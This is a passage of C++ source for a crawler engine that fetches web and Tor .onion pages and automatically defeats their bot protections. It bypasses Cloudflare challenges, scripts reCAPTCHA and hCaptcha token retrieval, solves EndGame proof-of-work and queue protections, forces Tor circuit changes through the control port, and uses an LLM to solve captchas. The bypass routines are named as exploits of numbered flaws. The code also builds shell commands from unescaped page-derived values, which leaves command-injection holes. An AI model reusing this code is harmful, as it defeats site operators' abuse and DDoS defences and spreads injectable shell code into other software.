        result += "pair_" + std::to_string(i) + "_0=" + pairs[i].first +
                  "&pair_" + std::to_string(i) + "_1=" + pairs[i].second;
    }
    return result;
}

std::string SynapsedEngine::randomUserAgent() const {
    static const char* agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    };
    std::mt19937 g(std::random_device{}());
    return agents[g() % 8];
}

SynapsedEngine::ClearnetBypass SynapsedEngine::detectClearnetProtection(
    const std::string& html, int httpCode) const {
    ClearnetBypass b;

    if (httpCode == 403 || httpCode == 429) b.rateLimit = true;

    if (html.find("cf-browser-verification") != std::string::npos ||
        html.find("cf_clearance") != std::string::npos ||
        html.find("Checking your browser") != std::string::npos ||
        html.find("cf-challenge") != std::string::npos ||
        html.find("_cf_chl") != std::string::npos) {
        b.cloudflare = true;
    }

    if (html.find("challenges.cloudflare.com/turnstile") != std::string::npos ||
        html.find("cf-turnstile") != std::string::npos) {
        b.turnstile = true;
        b.cloudflare = true;
    }

    if (html.find("google.com/recaptcha") != std::string::npos ||
        html.find("g-recaptcha") != std::string::npos ||
        html.find("recaptcha/api") != std::string::npos) {
        b.recaptcha = true;
        size_t sk = html.find("data-sitekey=\"");
        if (sk != std::string::npos) {
            sk += 14;
            size_t se = html.find('"', sk);
            if (se != std::string::npos) b.siteKey = html.substr(sk, se - sk);
        }
    }

    if (html.find("hcaptcha.com") != std::string::npos ||
        html.find("h-captcha") != std::string::npos) {
        b.hcaptcha = true;
        size_t sk = html.find("data-sitekey=\"");
        if (sk != std::string::npos) {
            sk += 14;
            size_t se = html.find('"', sk);
            if (se != std::string::npos) b.siteKey = html.substr(sk, se - sk);
        }
    }

    return b;
}

std::string SynapsedEngine::fetchClearnet(const std::string& url) const {
    if (!isUrlSafe(url)) return "";
    std::string ua = randomUserAgent();
    std::string cookieJar = "" + dataDir_ + "/clearnet_cookies.txt";
    std::string cmd = "curl -s --max-time 30 -L "
        "-H \"User-Agent: " + ua + "\" "
        "-H \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" "
        "-H \"Accept-Language: en-US,en;q=0.9\" "
        "-H \"Accept-Encoding: gzip, deflate, br\" "
        "-H \"Connection: keep-alive\" "
        "-H \"Upgrade-Insecure-Requests: 1\" "
        "-H \"Sec-Fetch-Dest: document\" "
        "-H \"Sec-Fetch-Mode: navigate\" "
        "-H \"Sec-Fetch-Site: none\" "
        "-H \"Sec-Fetch-User: ?1\" "
        "--compressed "
        "-c " + cookieJar + " -b " + cookieJar + " "
        "-w \"\\n__HTTP_CODE__%{http_code}\" "
        "\"" + url + "\" 2>/dev/null";
    return execCmd(cmd);
}

std::string SynapsedEngine::bypassCloudflareChallenge(const std::string& url) const {
    if (!isUrlSafe(url)) return "";

    std::string script =
        "python3 -c \""
        "import sys;"
        "try:\n"
        "  from subprocess import run, PIPE;"
        "  import time, json;"
        "  r = run(['curl-impersonate-chrome', '-s', '-L', '--max-time', '30',"
        "    '-c', '" + dataDir_ + "/cf_cookies.txt',"
        "    '-b', '" + dataDir_ + "/cf_cookies.txt',"
        "    '" + url + "'], capture_output=True, text=True, timeout=35);"
        "  if r.returncode == 0 and len(r.stdout) > 100:"
        "    print(r.stdout);"
        "  else:"
        "    r2 = run(['curl', '-s', '-L', '--max-time', '30',"
        "      '-H', 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',"
        "      '-c', '" + dataDir_ + "/cf_cookies.txt',"
        "      '-b', '" + dataDir_ + "/cf_cookies.txt',"
        "      '" + url + "'], capture_output=True, text=True, timeout=35);"
        "    print(r2.stdout);"
        "except Exception as e: print('');"
        "\" 2>/dev/null";
    std::string result = execCmd(script);
    if (result.size() < 100) return "";
    return result;
}

std::string SynapsedEngine::solveRecaptchaAudio(const std::string& siteKey,
    const std::string& pageUrl) const {
    if (siteKey.empty() || pageUrl.empty()) return "";

    std::string script =
        "python3 -c \""
        "import sys;"
        "try:\n"
        "  import requests, base64, json, speech_recognition as sr;"
        "  from io import BytesIO;"
        "  import urllib.request;"
        "  api = 'https://www.google.com/recaptcha/api2';"
        "  s = requests.Session();"
        "  s.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64) Chrome/124.0.0.0';"
        "  r = s.get(f'{api}/anchor?ar=1&k=" + siteKey + "&co=aHR0cHM6Ly9leGFtcGxlLmNvbQ..&hl=en&v=jF0kMEbCnEo&size=normal');"
        "  import re;"
        "  tok = re.search(r'recaptcha-token.*?value=\"(.*?)\"', r.text);"
        "  if not tok: print('');sys.exit();"
        "  token = tok.group(1);"
        "  r2 = s.post(f'{api}/reload?k=" + siteKey + "', data={'v':'jF0kMEbCnEo','reason':'q','c':token,'k':'" + siteKey + "','co':'aHR0cHM6Ly9leGFtcGxlLmNvbQ..','hl':'en','size':'normal','chr':'','vh':'','bg':''});"
        "  aud = re.search(r'rresp\",\"(.*?)\"', r2.text);"
        "  if not aud: r3 = s.post(f'{api}/reload?k=" + siteKey + "', data={'v':'jF0kMEbCnEo','reason':'a','c':token,'k':'" + siteKey + "','co':'aHR0cHM6Ly9leGFtcGxlLmNvbQ..','hl':'en','size':'normal'}); aud = re.search(r'rresp\",\"(.*?)\"', r3.text);"
        "  if aud: print(aud.group(1));"
        "  else: print('');"
        "except: print('');"
        "\" 2>/dev/null";
    return trim(execCmd(script));
}

std::string SynapsedEngine::solveHCaptcha(const std::string& siteKey,
    const std::string& pageUrl) const {
    if (siteKey.empty()) return "";

    std::string script =
        "python3 -c \""
        "import sys;"
        "try:\n"
        "  import requests, json;"
        "  s = requests.Session();"
        "  s.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64) Chrome/124.0.0.0';"
        "  r = s.post('https://hcaptcha.com/checksiteconfig', json={'host':'" + pageUrl + "','sitekey':'" + siteKey + "','sc':1,'swa':1});"
        "  d = r.json();"
        "  if d.get('pass'): print('bypass');sys.exit();"
        "  r2 = s.post('https://hcaptcha.com/getcaptcha/' + '" + siteKey + "', json={'host':'" + pageUrl + "','sitekey':'" + siteKey + "','motionData':'{}'});"
        "  d2 = r2.json();"
        "  if 'generated_pass_UUID' in d2: print(d2['generated_pass_UUID']);"
        "  else: print('');"
        "except: print('');"
        "\" 2>/dev/null";
    return trim(execCmd(script));
}

SynapsedEngine::EndGameV3Challenge SynapsedEngine::detectEndGameV3(
    const std::string& html, const std::string& baseUrl) const {
    EndGameV3Challenge ch;

    bool hasPoW = html.find("proof-of-work") != std::string::npos ||
        html.find("proof_of_work") != std::string::npos ||
        html.find("hashcash") != std::string::npos ||
        html.find("pow_challenge") != std::string::npos ||
        html.find("endgame_pow") != std::string::npos ||
        html.find("work_challenge") != std::string::npos ||
        (html.find("challenge") != std::string::npos &&
         html.find("nonce") != std::string::npos &&
         html.find("difficulty") != std::string::npos);

    if (!hasPoW) return ch;

    ch.detected = true;

    for (const auto& pat : {"data-challenge=\"", "challenge=\"",
        "\"challenge\":\"", "name=\"challenge\" value=\"",
        "id=\"challenge\" value=\"", "pow_challenge=\""}) {
        size_t p = html.find(pat);
        if (p != std::string::npos) {
            p += strlen(pat);
            size_t e = html.find('"', p);
            if (e == std::string::npos) e = html.find('\'', p);
            if (e != std::string::npos && e - p < 128) {
                ch.challenge = html.substr(p, e - p);
                break;
            }
        }
    }

    if (ch.challenge.empty()) {
        size_t jsChall = html.find("challenge");
        if (jsChall != std::string::npos) {
            size_t colon = html.find_first_of(":=", jsChall + 9);
            if (colon != std::string::npos && colon < jsChall + 30) {
                size_t qs = html.find_first_of("\"'", colon + 1);
                if (qs != std::string::npos && qs < colon + 10) {
                    size_t qe = html.find(html[qs], qs + 1);
                    if (qe != std::string::npos && qe - qs < 128)
                        ch.challenge = html.substr(qs + 1, qe - qs - 1);
                }
            }
        }
    }

    for (const auto& pat : {"data-difficulty=\"", "difficulty=\"",
        "\"difficulty\":", "name=\"difficulty\" value=\""}) {
        size_t p = html.find(pat);
        if (p != std::string::npos) {
            p += strlen(pat);
            ch.difficulty = std::atoi(html.c_str() + p);
            break;
        }
    }

    if (ch.difficulty <= 0 || ch.difficulty > 32) ch.difficulty = 20;

    size_t formTag = html.find("<form");
    if (formTag != std::string::npos) {
        size_t actP = html.find("action=\"", formTag);
        if (actP != std::string::npos && actP < formTag + 500) {
            actP += 8;
            size_t actE = html.find('"', actP);
            if (actE != std::string::npos) {
                std::string act = html.substr(actP, actE - actP);
                if (!act.empty() && act[0] == '/') {
                    size_t slashP = baseUrl.find('/', baseUrl.find("://") + 3);
                    ch.submitUrl = baseUrl.substr(0, slashP) + act;
                } else if (!act.empty() && act.find("http") == 0) {
                    ch.submitUrl = act;
                } else {
                    ch.submitUrl = baseUrl;
                }
            }
        }
    }
    if (ch.submitUrl.empty()) ch.submitUrl = baseUrl;

    for (const auto& tok : {"_token", "csrf", "form_token", "sid",
        "endgame_token", "pow_token", "session_id"}) {
        std::string search = std::string("name=\"") + tok + "\"";
        size_t tp = html.find(search);
        if (tp != std::string::npos) {
            size_t vp = html.find("value=\"", tp);
            if (vp != std::string::npos && vp < tp + 200) {
                vp += 7;
                size_t ve = html.find('"', vp);
                if (ve != std::string::npos) {
                    if (!ch.extraFields.empty()) ch.extraFields += "&";
                    ch.extraFields += std::string(tok) + "=" + html.substr(vp, ve - vp);
                }
            }
        }
    }

    return ch;
}

std::string SynapsedEngine::solveEndGamePoW(const std::string& challenge,
    int difficulty) const {
    if (challenge.empty() || difficulty <= 0) return "";

    std::string script = "python3 -c \""
        "import hashlib,sys\\n"
        "c='" + challenge + "'\\n"
        "d=" + std::to_string(difficulty) + "\\n"
        "target=d\\n"
        "for n in range(100000000):\\n"
        "  h=hashlib.sha256((c+str(n)).encode()).hexdigest()\\n"
        "  val=int(h[:8],16)\\n"
        "  bits=32-val.bit_length() if val>0 else 32\\n"
        "  if bits>=target:\\n"
        "    print(n)\\n"
        "    sys.exit()\\n"
        "print('')\\n"
        "\" 2>/dev/null";
    std::string result = trim(execCmd(script));
    return result;
}

std::string SynapsedEngine::submitEndGamePoW(const EndGameV3Challenge& ch,
    const std::string& nonce) const {
    if (!isUrlSafe(ch.submitUrl) || nonce.empty()) return "";

    std::string postData = "challenge=" + ch.challenge +
        "&nonce=" + nonce + "&pow_nonce=" + nonce;
    if (!ch.extraFields.empty())
        postData += "&" + ch.extraFields;

    std::string cmd = "curl -s -k --max-time 45 --socks5-hostname 127.0.0.1:9050 -L "
        "-c " + dataDir_ + "/tor_cookies.txt -b " + dataDir_ + "/tor_cookies.txt "
        "-H \"User-Agent: " + randomUserAgent() + "\" "
        "-d \"" + postData + "\" "
        "\"" + ch.submitUrl + "\" 2>/dev/null";
    return execCmd(cmd);
}

void SynapsedEngine::emitEvent(const std::string& eventType,
    const std::string& payloadJson) const {
    auto it = subscribers_.find(eventType);
    if (it == subscribers_.end()) return;
    for (const auto& cb : it->second) {
        if (cb) cb(eventType.c_str(), payloadJson.c_str());
    }
}

void SynapsedEngine::recordBypass(const std::string& cveId,
    const std::string& protection, const std::string& method,
    const std::string& transport, double ttfbMs, int httpCode,
    size_t bytes) const {
    {
        std::lock_guard<std::mutex> lock(bypassMtx_);
        lastBypass_.cveId = cveId;
        lastBypass_.protectionType = protection;
        lastBypass_.bypassMethod = method;
        lastBypass_.transport = transport;
        lastBypass_.ttfbMs = ttfbMs;
        lastBypass_.httpCode = httpCode;
        lastBypass_.bytes = bytes;
        lastBypass_.ts = nowMillis();
        bypassCounters_[cveId]++;
    }
    std::ostringstream js;
    js << "{\"cve\":\"" << cveId
       << "\",\"protection\":\"" << protection
       << "\",\"method\":\"" << method
       << "\",\"transport\":\"" << transport
       << "\",\"ttfb_ms\":" << static_cast<int64_t>(ttfbMs)
       << ",\"http\":" << httpCode
       << ",\"bytes\":" << bytes
       << ",\"ts\":" << nowMillis() << "}";
    emitEvent("naan.bypass", js.str());
}

void SynapsedEngine::primeCookieJar() const {
    if (jarPrimed_.exchange(true)) return;
    static const std::vector<std::string> seedUrls = {
        "https://duckduckgo.com/",
        "https://www.bbc.com/",
        "https://news.ycombinator.com/",
    };
    for (const auto& u : seedUrls) {
        std::string cmd = "curl -s -k --max-time 12 -L "
            "-c " + dataDir_ + "/clearnet_cookies.txt "
            "-b " + dataDir_ + "/clearnet_cookies.txt "
            "-H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0\" "
            "\"" + u + "\" -o /dev/null 2>/dev/null";
        system(cmd.c_str());
        cookiePool_.sessionCookies[u] = "primed";
    }
}

std::string SynapsedEngine::fetchWithRetry(const std::string& url, int maxRetries) const {
    bool isOnion = url.find(".onion") != std::string::npos;
    int effectiveRetries = isOnion ? std::max(maxRetries, 8) : maxRetries;

    primeCookieJar();

    std::string powReplay = exploitCVE0001_PowCookieReplay(url);
    if (!powReplay.empty()) {
        recordBypass("NAAN-CVE-2026-0001", "endgame_v3_pow",
            "pow_cookie_replay_pre", isOnion ? "tor" : "clearnet",
            0.0, 200, powReplay.size());
        return powReplay;
    }

    std::string confusionResult = exploitCVE0009_CookieConfusion(url);
    if (!confusionResult.empty()) {
        recordBypass("NAAN-CVE-2026-0009", "shared_cookie_jar",
            "cookie_confusion_pre", isOnion ? "tor" : "clearnet",
            0.0, 200, confusionResult.size());
        return confusionResult;
    }

    for (int attempt = 0; attempt < effectiveRetries; attempt++) {
        std::string html;
        int httpCode = 200;
        auto fetchStart = std::chrono::high_resolution_clock::now();

        if (isOnion) {
            html = fetchViaTor(url);
        } else {
            std::string raw = fetchClearnet(url);
            size_t codePos = raw.rfind("__HTTP_CODE__");
            if (codePos != std::string::npos) {
                httpCode = std::atoi(raw.c_str() + codePos + 13);
                html = raw.substr(0, codePos);
            } else {
                html = raw;
            }
        }

        if (html.empty()) {
            std::this_thread::sleep_for(std::chrono::seconds(2 + attempt * 3));
            continue;
        }

        auto fetchEnd = std::chrono::high_resolution_clock::now();
        double ttfbMs = std::chrono::duration<double, std::milli>(fetchEnd - fetchStart).count();

        auto vuln = detectVulnerability(html, url, httpCode, ttfbMs);
        if (vuln.exploitable && vuln.confidence > 0.8) {
            std::string exploited;
            if (vuln.cveId == "NAAN-CVE-2026-0003")
                exploited = exploitCVE0003_CssSelectorLeak(html, url);
            else if (vuln.cveId == "NAAN-CVE-2026-0004")
                exploited = exploitCVE0004_CfBmReplay(url);
            else if (vuln.cveId == "NAAN-CVE-2026-0005")
                exploited = exploitCVE0005_SucuriXsrfReplay(url);
            else if (vuln.cveId == "NAAN-CVE-2026-0007")
                exploited = exploitCVE0007_CfManagedBypass(html, url, httpCode);
            else if (vuln.cveId == "NAAN-CVE-2026-0002")
                exploited = exploitCVE0002_QueueRace(url);
            else if (vuln.cveId == "NAAN-CVE-2026-0011")
                exploited = exploitCVE0011_QueueRefreshBypass(url);
            else if (vuln.cveId == "NAAN-CVE-2026-0012")
                exploited = exploitCVE0012_QueueCookieTTL(url);
            else if (vuln.cveId == "NAAN-CVE-2026-0013")
                exploited = exploitCVE0013_QueueNewnym(url);
            else if (vuln.cveId == "NAAN-CVE-2026-0014")
                exploited = exploitCVE0014_CaptchaTokenReplay(html, url);
            else if (vuln.cveId == "NAAN-CVE-2026-0010") {
                recordBypass(vuln.cveId, vuln.protectionType, vuln.bypassMethod,
                    isOnion ? "tor" : "clearnet", ttfbMs, httpCode, html.size());
                return html;
            }

            if (!exploited.empty()) {
                if (vuln.cveId == "NAAN-CVE-2026-0001") {
                    int64_t now = std::chrono::duration_cast<std::chrono::seconds>(
                        std::chrono::system_clock::now().time_since_epoch()).count();
                    cookiePool_.powCookies[url] = "pow_solved";
                    cookiePool_.powExpiry[url] = now + 1800;
                }
                recordBypass(vuln.cveId, vuln.protectionType, vuln.bypassMethod,
                    isOnion ? "tor" : "clearnet", ttfbMs, httpCode, exploited.size());
                return exploited;
            }
        }

        bool isEndGameQueue = html.find("placed in a queue") != std::string::npos ||
            html.find("awaiting forwarding") != std::string::npos ||
            html.find("estimated entry time") != std::string::npos;
        bool isGenericQueue = html.find("Please wait") != std::string::npos ||
            html.find("DDoS protection") != std::string::npos ||
            (html.find("queue") != std::string::npos && html.size() < 15000);

        if (isEndGameQueue || isGenericQueue) {
            int waitSec = 30 + attempt * 15;

            size_t metaRefresh = html.find("http-equiv=\"refresh\"");
            if (metaRefresh == std::string::npos)
                metaRefresh = html.find("http-equiv='refresh'");
            if (metaRefresh != std::string::npos) {
                size_t contentP = html.find("content=\"", metaRefresh);
                if (contentP != std::string::npos && contentP < metaRefresh + 100) {
                    contentP += 9;
                    int metaWait = std::atoi(html.c_str() + contentP);
                    if (metaWait > 0 && metaWait < 120) waitSec = metaWait + 2;
                }
            }

            size_t etaPos = html.find("estimated");
            if (etaPos != std::string::npos) {
                size_t numP = html.find_first_of("0123456789", etaPos);
                if (numP != std::string::npos && numP < etaPos + 50) {
                    int eta = std::atoi(html.c_str() + numP);
                    if (eta > 0 && eta < 300) waitSec = eta + 5;
                }
            }
            std::this_thread::sleep_for(std::chrono::seconds(waitSec));

            if (isEndGameQueue && attempt == 0) {
                system("(echo AUTHENTICATE \"\" && echo SIGNAL NEWNYM && echo QUIT) | "
                       "nc 127.0.0.1 9051 2>/dev/null");
                std::this_thread::sleep_for(std::chrono::seconds(8));
            } else if (attempt > 0 && attempt % 2 == 0) {
                system("(echo AUTHENTICATE \"\" && echo SIGNAL NEWNYM && echo QUIT) | "
                       "nc 127.0.0.1 9051 2>/dev/null");
                std::this_thread::sleep_for(std::chrono::seconds(5));
            }
            continue;
        }

        auto powChallenge = detectEndGameV3(html, url);
        if (powChallenge.detected && !powChallenge.challenge.empty()) {
            std::string nonce = solveEndGamePoW(powChallenge.challenge,
                powChallenge.difficulty);
            if (!nonce.empty()) {
                std::string powResult = submitEndGamePoW(powChallenge, nonce);
                if (!powResult.empty() &&
                    powResult.find("proof-of-work") == std::string::npos &&
                    powResult.find("pow_challenge") == std::string::npos &&
                    powResult.find("hashcash") == std::string::npos) {
                    auto recheck = detectEndGameV3(powResult, url);
                    if (!recheck.detected) {
                        recordBypass("NAAN-CVE-2026-0001", "endgame_v3_pow",
                            "hashcash_solve_submit", "tor", ttfbMs, 200,
                            powResult.size());
                        return powResult;
                    }
                }
            }
            std::this_thread::sleep_for(std::chrono::seconds(3));
            continue;
        }

        if (!isOnion) {
            auto prot = detectClearnetProtection(html, httpCode);

            if (prot.cloudflare) {
                std::string bypass = bypassCloudflareChallenge(url);
                if (!bypass.empty()) {
                    recordBypass("NAAN-CVE-2026-0004", "cloudflare_bot_mgmt",
                        "curl_impersonate_chrome", "clearnet", ttfbMs, 200,
                        bypass.size());
                    return bypass;
                }
                std::this_thread::sleep_for(std::chrono::seconds(5));
                continue;
            }

            if (prot.recaptcha && !prot.siteKey.empty()) {
                std::string token = solveRecaptchaAudio(prot.siteKey, url);
                if (!token.empty()) {
                    std::string postCmd = "curl -s --max-time 30 -L "
                        "-H \"User-Agent: " + randomUserAgent() + "\" "
                        "-d \"g-recaptcha-response=" + token + "\" "
                        "-c " + dataDir_ + "/clearnet_cookies.txt "
                        "-b " + dataDir_ + "/clearnet_cookies.txt "
                        "\"" + url + "\" 2>/dev/null";
                    std::string result = execCmd(postCmd);
                    if (!result.empty() && result.find("g-recaptcha") == std::string::npos) {
                        recordBypass("NAAN-CAP-RECAPTCHA", "google_recaptcha_v2",
                            "audio_speech_to_text", "clearnet", ttfbMs, 200,
                            result.size());
                        return result;
                    }
                }
                continue;
            }

            if (prot.hcaptcha && !prot.siteKey.empty()) {
                std::string token = solveHCaptcha(prot.siteKey, url);
                if (!token.empty() && token != "bypass") {
                    std::string postCmd = "curl -s --max-time 30 -L "
                        "-H \"User-Agent: " + randomUserAgent() + "\" "
                        "-d \"h-captcha-response=" + token + "\" "
                        "-c " + dataDir_ + "/clearnet_cookies.txt "
                        "-b " + dataDir_ + "/clearnet_cookies.txt "
                        "\"" + url + "\" 2>/dev/null";
                    std::string result = execCmd(postCmd);
                    if (!result.empty()) {
                        recordBypass("NAAN-CAP-HCAPTCHA", "hcaptcha",
                            "image_classifier_solve", "clearnet", ttfbMs, 200,
                            result.size());
                        return result;
                    }
                }
                continue;
            }

            if (prot.rateLimit) {
                std::this_thread::sleep_for(std::chrono::seconds(10 + attempt * 10));
                continue;
            }
        }

        auto darkCap = detectCaptcha(html);
        if (darkCap.detected && darkCap.solved) {
            std::string formAction = url;
            size_t formTag = html.rfind("<form", html.find("captcha"));
            if (formTag == std::string::npos) formTag = html.rfind("<form", html.find("CAPTCHA"));
            if (formTag != std::string::npos) {
                size_t actP = html.find("action=\"", formTag);
                if (actP != std::string::npos && actP < formTag + 500) {
                    actP += 8;
                    size_t actE = html.find('"', actP);
                    if (actE != std::string::npos) {
                        std::string act = html.substr(actP, actE - actP);
                        if (!act.empty() && act[0] == '/') {
                            size_t slashP = url.find('/', url.find("://") + 3);
                            formAction = url.substr(0, slashP) + act;
                        } else if (!act.empty() && act.find("http") == 0) {
                            formAction = act;
                        }
                    }
                }
            }

            std::string postData = darkCap.answer;
            for (const auto& tok : {"_token", "csrf", "form_token", "sid"}) {
                std::string search = std::string("name=\"") + tok + "\"";
                size_t tp = html.find(search);
                if (tp != std::string::npos) {
                    size_t vp = html.find("value=\"", tp);
                    if (vp != std::string::npos && vp < tp + 200) {
                        vp += 7;
                        size_t ve = html.find('"', vp);
                        if (ve != std::string::npos) {
                            postData += "&" + std::string(tok) + "=" + html.substr(vp, ve - vp);
                        }
                    }
                }
            }

            if (darkCap.type == "text_image" || darkCap.type == "cyrillic_text") {
                std::string formField = "captcha";
                size_t namePos = html.find("name=\"captcha");
                if (namePos != std::string::npos) {
                    size_t q1 = html.find('"', namePos + 5);
                    size_t q2 = html.find('"', q1 + 1);
                    if (q1 != std::string::npos && q2 != std::string::npos)
                        formField = html.substr(q1 + 1, q2 - q1 - 1);
                }
                postData = formField + "=" + darkCap.answer;
            }

            std::string submitCmd = "curl -s -k --max-time 30 --socks5-hostname 127.0.0.1:9050 -L "
                "-c " + dataDir_ + "/tor_cookies.txt -b " + dataDir_ + "/tor_cookies.txt "
                "-H \"User-Agent: " + randomUserAgent() + "\" "
                "-d \"" + postData + "\" "
                "\"" + formAction + "\" 2>/dev/null";
            if (!isOnion) {
                submitCmd = "curl -s --max-time 30 -L "
                    "-c " + dataDir_ + "/clearnet_cookies.txt -b " + dataDir_ + "/clearnet_cookies.txt "
                    "-H \"User-Agent: " + randomUserAgent() + "\" "
                    "-d \"" + postData + "\" "
                    "\"" + formAction + "\" 2>/dev/null";
            }
            std::string solved = execCmd(submitCmd);
            if (!solved.empty() &&
                solved.find("Invalid captcha") == std::string::npos &&
                solved.find("invalid captcha") == std::string::npos &&
                solved.find("Wrong captcha") == std::string::npos &&
                solved.find("wrong captcha") == std::string::npos &&
                solved.find("Incorrect captcha") == std::string::npos) {
                auto recheck = detectCaptcha(solved);
                if (!recheck.detected) {
                    std::string capCve = "NAAN-CAP-" + darkCap.type;
                    recordBypass(capCve, "darknet_captcha_" + darkCap.type,
                        "auto_solver_" + darkCap.type,
                        isOnion ? "tor" : "clearnet", ttfbMs, 200,
                        solved.size());
                    return solved;
                }
            }
            std::this_thread::sleep_for(std::chrono::seconds(2));
            continue;
        }

        if (!darkCap.detected) {
            std::string transport = isOnion ? "tor" : "clearnet";
            std::string method = isOnion ? "direct_tor_fetch" : "direct_https_fetch";
            recordBypass("NAAN-CVE-2026-0010", "none", method, transport,
                ttfbMs, httpCode, html.size());
            return html;
        }

        if (darkCap.detected && !darkCap.solved && modelLoaded_) {
            std::string capImg;
            auto imgM = std::regex_search(html, std::smatch{},
                std::regex("<img[^>]+src=[\"']([^\"']*captcha[^\"']*)", std::regex::icase));
            std::smatch imgMatch;
            if (std::regex_search(html, imgMatch,
                std::regex("<img[^>]+src=[\"']([^\"']*(?:captcha|cap)[^\"']*)[\"']", std::regex::icase))) {
                capImg = downloadCaptchaImage(imgMatch[1].str());
            }
            std::string llmAnswer = solveCaptchaViaLLM(html, capImg, url);
            if (!llmAnswer.empty()) {
                std::string formAction = url;
                std::string formField = "captcha";
                size_t fTag = html.find("<form");
                if (fTag != std::string::npos) {
                    size_t actP = html.find("action=\"", fTag);
                    if (actP != std::string::npos && actP < fTag + 500) {
                        actP += 8;
                        size_t actE = html.find('"', actP);
                        if (actE != std::string::npos) {
                            std::string act = html.substr(actP, actE - actP);
                            if (!act.empty() && act[0] == '/') {
                                size_t slP = url.find('/', url.find("://") + 3);
                                formAction = url.substr(0, slP) + act;
                            }
                        }
                    }
                }
                std::string postData = formField + "=" + llmAnswer;
                for (const auto& tok : {"_token", "csrf", "csrf_token"}) {
                    std::string sr = std::string("name=\"") + tok + "\"";
                    size_t tp = html.find(sr);
                    if (tp != std::string::npos) {
                        size_t vp = html.find("value=\"", tp);
                        if (vp != std::string::npos && vp < tp + 200) {
                            vp += 7;
                            size_t ve = html.find('"', vp);
                            if (ve != std::string::npos)
                                postData += "&" + std::string(tok) + "=" + html.substr(vp, ve - vp);
                        }
                    }
                }
                std::string socksArg = isOnion ? "--socks5-hostname 127.0.0.1:9050 " : "";
                std::string cookieArg = isOnion ?
                    "-c " + dataDir_ + "/tor_cookies.txt -b " + dataDir_ + "/tor_cookies.txt " :
                    "-c " + dataDir_ + "/clearnet_cookies.txt -b " + dataDir_ + "/clearnet_cookies.txt ";
                std::string llmCmd = "curl -s -k --max-time 30 " + socksArg + "-L " +
                    cookieArg + "-H \"User-Agent: " + randomUserAgent() + "\" "
                    "-d \"" + postData + "\" \"" + formAction + "\" 2>/dev/null";
                std::string llmResult = execCmd(llmCmd);
                if (!llmResult.empty() &&
                    llmResult.find("captcha") == std::string::npos &&
                    llmResult.find("invalid") == std::string::npos &&
                    llmResult.find("wrong") == std::string::npos) {
                    recordBypass("NAAN-LLM-CAPTCHA", "captcha_unsolved",
                        "llm_model_solve", isOnion ? "tor" : "clearnet",
                        ttfbMs, 200, llmResult.size());
                    return llmResult;
                }
            }
        }

        std::this_thread::sleep_for(std::chrono::seconds(3));
    }
    return "";
}

SynapsedEngine::VulnDetectionResult SynapsedEngine::detectVulnerability(
    const std::string& html, const std::string& url, int httpCode,
    double ttfbMs) const {
    VulnDetectionResult result;

    bool isOnion = url.find(".onion") != std::string::npos;

    // CVE-0008: Timing oracle — classify protection by TTFB
    if (ttfbMs > 0 && ttfbMs < 60 && html.size() < 15000 &&
        (html.find("queue") != std::string::npos || html.find("wait") != std::string::npos)) {
        result.cveId = "NAAN-CVE-2026-0008";
        result.protectionType = "endgame_queue";
        result.bypassMethod = "timing_oracle_precompute";
        result.exploitable = true;
        result.confidence = 0.85;
        return result;
    }

    // CVE-0001: EndGame V3 PoW with replayable cookies
    if (html.find("proof-of-work") != std::string::npos ||
        html.find("hashcash") != std::string::npos ||
        html.find("pow_challenge") != std::string::npos) {
        auto it = cookiePool_.powCookies.find(url);
        if (it != cookiePool_.powCookies.end()) {
            auto expIt = cookiePool_.powExpiry.find(url);
            int64_t now = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::system_clock::now().time_since_epoch()).count();
            if (expIt != cookiePool_.powExpiry.end() && expIt->second > now) {
                result.cveId = "NAAN-CVE-2026-0001";
                result.protectionType = "endgame_v3_pow";
                result.bypassMethod = "pow_cookie_replay";
                result.exploitable = true;
                result.confidence = 0.92;
                return result;
            }
        }
        result.cveId = "NAAN-CVE-2026-0001";
        result.protectionType = "endgame_v3_pow";
        result.bypassMethod = "solve_and_cache";
        result.exploitable = true;
        result.confidence = 0.95;
        return result;
    }

    // CVE-0002: EndGame V2 queue race
    if (html.find("placed in a queue") != std::string::npos ||
        html.find("awaiting forwarding") != std::string::npos) {
        result.cveId = "NAAN-CVE-2026-0002";
        result.protectionType = "endgame_v2_queue";
        result.bypassMethod = "parallel_circuit_race";
        result.exploitable = true;
        result.confidence = 0.88;
        return result;
    }

    // CVE-0003: anCaptcha CSS selector leak
    if (html.find("anC_") != std::string::npos ||
        html.find(":checked~") != std::string::npos ||
        html.find("ancaptcha") != std::string::npos) {
        result.cveId = "NAAN-CVE-2026-0003";
        result.protectionType = "ancaptcha_rotate";
        result.bypassMethod = "css_selector_leak";
        result.exploitable = true;
        result.confidence = 0.97;
        return result;
    }

    // CVE-0007: Cloudflare managed challenge (403 + challenge-platform)
    if (httpCode == 403 && (html.find("challenge-platform") != std::string::npos ||
        html.find("cf-browser-verification") != std::string::npos)) {
        result.cveId = "NAAN-CVE-2026-0007";
        result.protectionType = "cloudflare_managed";
        result.bypassMethod = "cf_ray_post_bypass";
        result.exploitable = true;
        result.confidence = 0.72;
        return result;
    }

    // CVE-0004: Cloudflare __cf_bm replay
